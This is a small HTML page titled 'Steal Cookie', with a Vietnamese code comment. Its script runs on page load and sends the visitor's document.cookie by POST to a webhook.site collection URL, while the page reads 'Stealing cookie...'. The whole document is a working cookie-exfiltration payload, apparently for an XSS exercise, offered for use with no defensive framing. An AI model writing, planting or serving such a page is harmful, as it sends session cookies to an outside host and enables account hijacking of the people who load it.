<!DOCTYPE html>
<html>
  <head>
    <title>Steal Cookie</title>
    <script>
      // Đợi DOM load xong để đảm bảo document.cookie sẵn sàng
      window.onload = function () {
        fetch("https://webhook.site/72b6be16-1d8e-4848-96d7-379f271f1b7a", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: "cookie=" + encodeURIComponent(document.cookie),
        });
      };
    </script>
  </head>
  <body>
    <p>Stealing cookie...</p>
  </body>
</html>
